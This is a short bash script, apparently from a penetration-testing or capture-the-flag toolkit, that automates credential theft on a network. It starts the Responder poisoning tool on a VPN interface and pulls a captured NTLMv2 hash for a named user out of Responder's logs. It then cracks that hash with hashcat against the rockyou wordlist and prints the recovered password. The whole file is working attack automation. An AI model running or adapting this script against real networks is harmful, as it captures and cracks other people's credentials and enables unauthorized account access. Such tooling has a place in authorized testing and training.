#!/bin/bash

start_responder() {
    local responder_log="log/responder.log"
    if [ ! -z "$log_dir" ]; then
        responder_log="$log_dir/responder.log"
    fi
    if pgrep -f "responder -I tun0"; then
        echo "Responder is already running."
        return 1
    fi
    script -c "sudo responder -I tun0" $responder_log &
    #| tee -a $responder_log 2>&1 & 
    #tee >(sed $'s/\033[[][^A-Za-z]*[A-Za-z]//g' >> $trail_log 2>&1 &
}

stop_responder() {
    if pgrep -f "responder -I tun0"; then
        echo "Stopping Responder..."
        pkill -f "responder -I tun0"
    else
        echo "No Responder is running."
    fi
}

get_responder_ntlm() {
    local user=$1
    local responder_txt="/usr/share/responder/logs/SMB-NTLMv2-SSP-$ip.txt"
    if [ -f "$responder_txt" ]; then
        ntlm_hash=$(cat "$responder_txt" | grep $user | tail -n 1)
        echo "NTLM hash found: $ntlm_hash for $user"
        echo "$ntlm_hash" > $user.hash
    fi   
}

get_ntlm_password(){
    local user=$1
    local password=""
    if [ -f "$user.hash" ]; then
        hashid $user.hash >> $trail_log
        hashcat --help | grep -i "ntlm" >> $trail_log
        hashcat -m 5600 $user.hash /usr/share/wordlists/rockyou.txt >> $trail_log
        local user_upper=${user^^}  
        password=$(hashcat --show $user.hash | grep $user_upper | awk -F ":" '{print $7}'  )
    fi
    echo "$password"
}